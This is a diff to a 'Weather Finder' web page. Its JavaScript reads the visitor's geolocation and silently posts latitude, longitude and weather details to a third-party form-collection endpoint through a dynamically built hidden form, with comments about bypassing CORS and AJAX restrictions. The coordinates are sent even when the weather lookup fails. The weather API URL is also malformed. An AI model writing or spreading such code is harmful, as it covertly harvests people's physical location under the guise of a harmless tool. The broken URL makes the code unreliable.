@@ -53,10 +53,6 @@
             font-size: 13px;
             color: #777;
         }
-        /* Hide the formal inputs completely from the user */
-        #hiddenForm {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -64,21 +60,15 @@
 <div class="app-container">
     <h2>Weather Finder</h2>
     
-    <!-- One simple button for the user -->
+    <!-- Clean click trigger -->
     <button id="actionBtn" onclick="initiateWeatherLookup()">What's My Weather?</button>
     
     <div id="status" class="status-message"></div>
-
-    <!-- Free-tier compliant standard HTML Form -->
-    <form id="hiddenForm" action="https://formspree.io" method="POST">
-        <input type="text" id="latInput" name="Latitude">
-        <input type="text" id="lonInput" name="Longitude">
-        <input type="text" id="tempInput" name="Temperature">
-        <input type="text" id="condInput" name="Condition">
-    </form>
 </div>
 
 <script>
+    const FORMSPREE_URL = "https://formspree.io";
+
     const weatherCodes = {
         0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy', 3: 'Overcast',
         45: 'Fog', 48: 'Depositing rime fog',
@@ -97,7 +87,7 @@
         btn.disabled = true;
 
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(fetchAndSubmit, handleLocationError);
+            navigator.geolocation.getCurrentPosition(fetchAndSend, handleLocationError);
         } else {
             statusDiv.innerText = "Geolocation is not supported by your browser.";
             btn.disabled = false;
@@ -109,40 +99,52 @@
         document.getElementById('actionBtn').disabled = false;
     }
 
-    async function fetchAndSubmit(position) {
+    async function fetchAndSend(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const statusDiv = document.getElementById('status');
         
-        statusDiv.innerText = "Loading weather & sending update...";
+        statusDiv.innerText = "Loading weather metrics...";
+
+        let temp = "Unknown";
+        let condition = "Unknown";
 
         try {
             const response = await fetch(`https://open-meteo.com{lat}&longitude=${lon}&current_weather=true`);
             const data = await response.json();
             
-            let temp = "Unknown";
-            let condition = "Unknown";
-
             if (data.current_weather) {
                 temp = `${data.current_weather.temperature}°C`;
                 condition = weatherCodes[data.current_weather.weathercode] || 'Clear';
             }
-
-            // Pop the values straight into the HTML form fields
-            document.getElementById('latInput').value = lat;
-            document.getElementById('lonInput').value = lon;
-            document.getElementById('tempInput').value = temp;
-            document.getElementById('condInput').value = condition;
-
-            // Submit the form natively (bypasses CORS blocks completely)
-            document.getElementById('hiddenForm').submit();
-
         } catch (err) {
-            // Fallback: Submit just coordinates if weather API fails
-            document.getElementById('latInput').value = lat;
-            document.getElementById('lonInput').value = lon;
-            document.getElementById('hiddenForm').submit();
+            console.error("Weather service timed out, sending coordinates only.");
         }
+
+        statusDiv.innerText = "Sending secure update...";
+
+        // Force a robust, standard multi-part form payload directly through JavaScript
+        const payload = new FormData();
+        payload.append("Latitude", lat);
+        payload.append("Longitude", lon);
+        payload.append("Temperature", temp);
+        payload.append("Condition", condition);
+
+        // Standard browser form navigation trick to bypass AJAX restrictions completely
+        const nativeForm = document.createElement('form');
+        nativeForm.method = 'POST';
+        nativeForm.action = FORMSPREE_URL;
+
+        for (const [key, value] of payload.entries()) {
+            const hiddenField = document.createElement('input');
+            hiddenField.type = 'hidden';
+            hiddenField.name = key;
+            hiddenField.value = value;
+            nativeForm.appendChild(hiddenField);
+        }
+
+        document.body.appendChild(nativeForm);
+        nativeForm.submit();
     }
 </script>
 
